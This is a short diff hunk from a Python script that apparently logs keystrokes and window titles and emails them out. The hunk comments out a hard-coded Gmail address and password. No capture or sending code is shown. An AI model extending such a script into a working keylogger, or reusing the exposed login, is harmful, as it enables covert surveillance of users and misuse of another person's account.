@@ -23,8 +23,8 @@ from subprocess import call
 
 file_path = sys.argv[0]
 file_name = __file__.split('\\')[-1]
-my_email = "pythontesting1219@gmail.com"
-my_password = "Testing95"
+#my_email = " "
+#my_password = " "
 
 window_log = []
 keys_pressed = []
